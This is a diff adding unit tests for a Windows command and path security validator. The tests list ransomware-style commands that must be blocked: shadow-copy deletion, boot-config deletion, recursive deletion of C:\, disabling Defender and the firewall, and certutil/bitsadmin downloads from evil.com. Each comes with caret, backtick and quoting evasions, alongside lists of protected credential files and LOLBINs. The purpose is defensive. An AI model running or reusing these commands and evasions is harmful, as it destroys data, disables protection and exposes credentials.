@@ -5,14 +5,12 @@ import os
 import tempfile
 import unittest
 from security import (
-    CRITICAL_PATHS,
     PROTECTED_PROCESS_NAMES,
-    SYSTEM_DRIVES,
-    audit_log,
-    is_admin,
     validate_command,
+    validate_launch_safety,
     validate_path_safety,
     validate_python_code,
+    validate_read_safety,
 )
 
 
@@ -32,6 +30,12 @@ class TestSecurityGuardrails(unittest.TestCase):
             "Get-Service | Where-Object { $_.Status -eq 'Running' }",
             "whoami",
             "hostname",
+            "del /s /q C:\\temp\\scratch",
+            "rd C:\\safe_dir /s /q",
+            "rmdir /s /q C:\\temp\\dir",
+            "Remove-Item -Recurse -Force C:\\Users\\user\\Downloads\\junk",
+            "taskkill /im notepad.exe",
+            "taskkill /f /im calc.exe",
         ]
         for cmd in benign_commands:
             is_safe, reason = validate_command(cmd)
@@ -201,17 +205,147 @@ class TestSecurityGuardrails(unittest.TestCase):
             self.assertFalse(is_safe, f"Encoded command variant was not blocked: '{v}'")
             self.assertIn("Obfuscated Payload", reason)
 
+    def test_shell_escape_evasion_blocked(self):
+        """Ensure PowerShell backtick and CMD caret evasions are normalized and blocked."""
+        evasions = [
+            "v`ssadmin delete shadows",
+            "v`s`s`a`d`m`i`n delete shadows",
+            "F`o`r`m`a`t-Volume -DriveLetter C",
+            "v^s^sadmin delete shadows",
+            "v^^ssadmin delete shadows",
+            "f^o^r^m^a^t c: /fs:ntfs",
+            "d^i^s^k^p^a^r^t",
+        ]
+        for cmd in evasions:
+            is_safe, reason = validate_command(cmd)
+            self.assertFalse(is_safe, f"Shell escape evasion command was not blocked: '{cmd}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
+    def test_quote_wrapped_command_evasions_blocked(self):
+        """Ensure dangerous commands with quoted executables or arguments are normalized and blocked."""
+        quote_evasions = [
+            # Quoted executables
+            'vssadmin "delete" "shadows"',
+            "vssadmin 'delete' 'shadows'",
+            '"vssadmin" delete shadows',
+            "'vssadmin' delete shadows",
+            '"vssadmin" "delete" "shadows"',
+            'wmic "shadowcopy" delete',
+            '"wmic" shadowcopy delete',
+            'wbadmin "delete"',
+            '"wbadmin" delete',
+            'fsutil "usn" deletejournal',
+            'bcdedit "/delete"',
+            "bcdedit '/delete'",
+            '"bcdedit" /delete',
+            '"bcdedit" "/delete"',
+            '"del" /s /q C:\\',
+            "'del' /s /q C:\\",
+            '"del" "/s" "/q" "C:\\"',
+            '"rd" /s /q C:\\',
+            '"rmdir" /s /q C:\\',
+            '"Remove-Item" -Recurse -Force C:\\',
+            "& 'Remove-Item' -Recurse -Force C:\\",
+            '& "Remove-Item" -Recurse -Force C:\\',
+            'Remove-Item "-Recurse" "-Force" "C:\\"',
+            "Remove-Item '-Recurse' '-Force' 'C:\\'",
+            'sc "stop" windefend',
+            '"sc" stop windefend',
+            'netsh "advfirewall" set allprofiles state off',
+            'taskkill "/im" msmpeng.exe',
+            '"taskkill" /im msmpeng.exe',
+            'certutil "-urlcache" http://evil.com/payload.exe',
+            'bitsadmin "/transfer" myjob http://evil.com/f.exe C:\\f.exe',
+        ]
+        for cmd in quote_evasions:
+            is_safe, reason = validate_command(cmd)
+            self.assertFalse(is_safe, f"Quote evasion was not blocked: '{cmd}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
+    def test_unspaced_cmd_switch_evasions_blocked(self):
+        """Ensure unspaced CMD switch delimiters (e.g. del/s/q, bcdedit/delete) are normalized and blocked."""
+        switch_evasions = [
+            "del/s/q C:\\",
+            "del/f/s/q C:\\",
+            "erase/s/q C:\\",
+            "rd/s/q C:\\",
+            'rd/s/q "C:\\"',
+            "rmdir/s/q C:\\",
+            'rmdir/s/q "C:\\"',
+            "bcdedit/delete",
+            "bcdedit/delete {default}",
+            "taskkill/im msmpeng.exe",
+            "taskkill/f/im msmpeng.exe",
+            '"del"/s/q C:\\',
+            '"rd"/s/q C:\\',
+            '"rmdir"/s/q C:\\',
+            '"bcdedit"/delete',
+            'bcdedit"/delete"',
+            '"taskkill"/im msmpeng.exe',
+        ]
+        for cmd in switch_evasions:
+            is_safe, reason = validate_command(cmd)
+            self.assertFalse(is_safe, f"Unspaced switch evasion was not blocked: '{cmd}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
+    def test_recursive_deletion_parameter_ordering_and_chaining_blocked(self):
+        """Ensure recursive root deletions with reordered parameters or command chaining/redirection are blocked."""
+        evasions = [
+            "del C:\\ /s /q",
+            "rd C:\\ /s /q",
+            "rmdir C:\\ /s /q",
+            "Remove-Item C:\\ -Recurse -Force",
+            'Remove-Item "C:\\" -Recurse -Force',
+            "del /s /q C:\\ & echo done",
+            "rd /s /q C:\\ & echo done",
+            "rmdir /s /q C:\\ > nul",
+            "del /s /q C:\\*.* & calc.exe",
+            'powershell -c "& { Remove-Item -Recurse -Force C:\\ }"',
+            "powershell -c \"& { 'Remove-Item' -Recurse -Force C:\\ }\"",
+            'powershell -Command "& { Remove-Item -Recurse -Force C:\\ }"',
+            'powershell -Command "Remove-Item -Recurse -Force C:\\; Write-Output done"',
+            "Remove-Item -Recurse -Force C:\\ }",
+        ]
+        for cmd in evasions:
+            is_safe, reason = validate_command(cmd)
+            self.assertFalse(is_safe, f"Reordered/chained recursive deletion was not blocked: '{cmd}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
+    def test_taskkill_colon_syntax_and_switch_chaining_blocked(self):
+        """Ensure taskkill with colon syntax and chained switches targeting Defender is blocked."""
+        evasions = [
+            "taskkill/im:msmpeng.exe",
+            "taskkill/im/f msmpeng.exe",
+            "taskkill /im:msmpeng.exe",
+            "taskkill /im:msmpeng.exe /f",
+            "taskkill /f /im:msmpeng.exe",
+            "taskkill.exe /im:msmpeng.exe",
+            "taskkill/f/im msmpeng.exe",
+            "taskkill/f/im/t:msmpeng.exe",
+        ]
+        for cmd in evasions:
+            is_safe, reason = validate_command(cmd)
+            self.assertFalse(is_safe, f"Taskkill Defender evasion was not blocked: '{cmd}'")
+            self.assertIn("SECURITY POLICY VIOLATION", reason)
+
 
 class TestPathSafety(unittest.TestCase):
     """Test suite verifying protected system directories and drive roots."""
 
     def test_drive_roots_blocked(self):
         """Ensure all drive root deletion/writes are blocked."""
-        roots = ["C:", "C:\\", "c:/", "D:", "D:\\", "E:\\", "Z:\\"]
+        roots = ["C:", "C:\\", "c:/", "D:", "D:\\", "E:", "E:\\", "Z:\\"]
         for r in roots:
             is_safe, reason = validate_path_safety(r, operation="delete")
             self.assertFalse(is_safe, f"Drive root was not blocked: '{r}'")
             self.assertIn("prohibited on drive root", reason)
+
+    def test_audit_log_protection(self):
+        """Ensure security_audit.log cannot be deleted or overwritten."""
+        for op in ("delete", "write"):
+            is_safe, reason = validate_path_safety("security_audit.log", operation=op)
+            self.assertFalse(is_safe)
+            self.assertIn("prohibited on security audit log", reason)
 
     def test_critical_system_paths_blocked(self):
         """Ensure C:\\Windows and other core system paths are blocked."""
@@ -331,6 +465,12 @@ class TestPythonASTValidation(unittest.TestCase):
             is_safe, reason = validate_python_code(code)
             self.assertFalse(is_safe, f"Python evasion snippet was not blocked: '{code}'")
 
+    def test_ast_handles_general_exceptions(self):
+        """Ensure non-SyntaxError exceptions (e.g. malformed or deeply nested input) do not raise unhandled exceptions."""
+        malformed = "def func(\n" * 50
+        is_safe, reason = validate_python_code(malformed)
+        self.assertTrue(is_safe)
+
 
 class TestProtectedProcesses(unittest.TestCase):
     """Test suite verifying protected critical system process list."""
@@ -349,6 +489,68 @@ class TestProtectedProcesses(unittest.TestCase):
         ]
         for proc in critical:
             self.assertIn(proc, PROTECTED_PROCESS_NAMES)
+
+
+class TestReadSafety(unittest.TestCase):
+    """Test suite verifying validate_read_safety protections."""
+
+    def test_reserved_dos_devices_blocked_for_read(self):
+        """Ensure reading reserved DOS devices is blocked to prevent server hangs."""
+        for dev in ("CON", "PRN", "AUX", "NUL", "COM1", "COM9", "LPT1", "con.txt", r"\\.\CON"):
+            is_safe, reason = validate_read_safety(dev)
+            self.assertFalse(is_safe, f"DOS device was not blocked for read: '{dev}'")
+            self.assertIn("reserved device", reason.lower())
+
+    def test_sensitive_credential_files_blocked(self):
+        """Ensure credentials including .env, .netrc, SSH, and AWS keys are blocked."""
+        sensitive_paths = [
+            ".env",
+            ".env.local",
+            ".env.production",
+            ".netrc",
+            "_netrc",
+            r"C:\Users\Default\.ssh\id_rsa",
+            r"C:\Users\Default\.aws\credentials",
+            r"C:\Users\Default\.git-credentials",
+        ]
+        for p in sensitive_paths:
+            is_safe, reason = validate_read_safety(p)
+            self.assertFalse(is_safe, f"Sensitive credential was not blocked: '{p}'")
+            self.assertIn("prohibited", reason.lower())
+
+    def test_registry_hives_blocked_unconditionally(self):
+        """Ensure Windows SAM, SYSTEM, and SECURITY hives are protected even if STRICT_MODE is disabled."""
+        import security
+        old_mode = security.STRICT_MODE
+        try:
+            for mode in (True, False):
+                security.STRICT_MODE = mode
+                for hive in (
+                    r"C:\Windows\System32\config\sam",
+                    r"C:\Windows\System32\config\system",
+                    r"C:\Windows\System32\config\security",
+                ):
+                    is_safe, reason = validate_read_safety(hive)
+                    self.assertFalse(is_safe, f"Registry hive was not blocked with STRICT_MODE={mode}: '{hive}'")
+                    self.assertIn("registry hive", reason.lower())
+        finally:
+            security.STRICT_MODE = old_mode
+
+
+class TestLaunchSafety(unittest.TestCase):
+    """Test suite verifying validate_launch_safety against LOLBINs and script evasions."""
+
+    def test_disallowed_launch_targets_and_extensions(self):
+        """Ensure LOLBINs (mshta, rundll32, regsvr32, conhost) and script extensions are blocked."""
+        targets = [
+            "mshta", "mshta.exe", "rundll32", "rundll32.exe",
+            "regsvr32", "regsvr32.exe", "conhost", "conhost.exe",
+            "test.hta", "virus.pif", "saver.scr", "old.com",
+        ]
+        for t in targets:
+            is_safe, reason = validate_launch_safety(t)
+            self.assertFalse(is_safe, f"Dangerous launch target '{t}' was not blocked")
+            self.assertIn("prohibited", reason.lower())
 
 
 if __name__ == "__main__":
